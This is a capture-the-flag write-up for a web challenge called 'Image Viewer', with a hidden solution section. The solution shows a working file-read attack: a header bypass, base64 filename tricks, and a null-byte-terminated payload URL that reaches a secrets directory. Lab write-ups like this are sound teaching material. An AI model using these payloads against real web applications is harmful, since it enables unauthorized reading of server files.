## Image Viewer

Look beyond what you see. Take a leap of faith.

[URL]

## Solution

<details>
	<summary>Click to reveal!</summary>

`?name=` is the GET parameter to specify an image.

Figure out that filenames are base64 encoded (but not the jpg/png extension), the default image extension is jpeg, and that a null-byte `%00` marks the end of a filename.

Send a request with an `X-Keys` header specifying a string whose md5 hash ends in 123456. For example:

`curl [URL] -H "X-Keys: d4390a27291e00035ccc5be8b677fd26"`

In the directory listing find `flag.png` and base64 decode the word `flag` via PHP (important) so that, when the filename is base64 encoded, you get `flag.png` again.

`/?name=(base64_decode of "flag").png%00`

The image shows a red herring. Literally :)

Also notice the `secrets` directory. Do the same as above, but decode `secrets/flag` this time (good thing base64 has slashes).

```php
<?php
echo urlencode(base64_decode("secrets/flag")); # %B1%E7%2Bz%DB%3F%7EV%A0
```

Payload: `[URL]?name=%B1%E7%2Bz%DB%3F%7EV%A0.png%00`
</details>
